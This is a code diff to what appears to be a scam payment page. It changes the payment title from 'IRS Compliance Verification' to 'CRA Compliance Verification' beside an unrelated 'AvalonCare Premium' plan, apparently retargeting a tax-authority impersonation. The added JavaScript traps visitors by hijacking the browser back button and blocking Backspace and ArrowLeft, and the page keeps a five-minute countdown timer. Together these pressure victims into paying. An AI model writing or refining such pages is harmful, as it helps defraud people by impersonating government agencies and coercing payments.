@@ -537,7 +537,7 @@ header .logo-card img {
     <div id="planNotification" class="notification-bar"></div>
 
 <div class="payment-description">
-    <p class="payment-title">You are authorizing IRS Compliance Verification</p>
+    <p class="payment-title">You are authorizing CRA Compliance Verification</p>
     <p class="payment-plan">🪽AvalonCare Premium</p> 
 </div>
 
@@ -628,6 +628,20 @@ header .logo-card img {
 
 </body>
 <script>
+  // Prevent user from going back to previous pages
+  history.pushState(null, null, location.href);
+
+  window.addEventListener('popstate', function () {
+    history.go(1); // keeps user on this page
+  });
+
+  // Optional: also prevent back with keyboard shortcuts
+  window.addEventListener('keydown', function (e) {
+    if ((e.key === 'Backspace' && e.target === document.body) || e.key === 'ArrowLeft') {
+      e.preventDefault();
+    }
+  });
+
 // ---------------- TIMER / SESSION INITIALIZATION ----------------
 const totalDuration = 5 * 60 * 1000; // 5 minutes
 
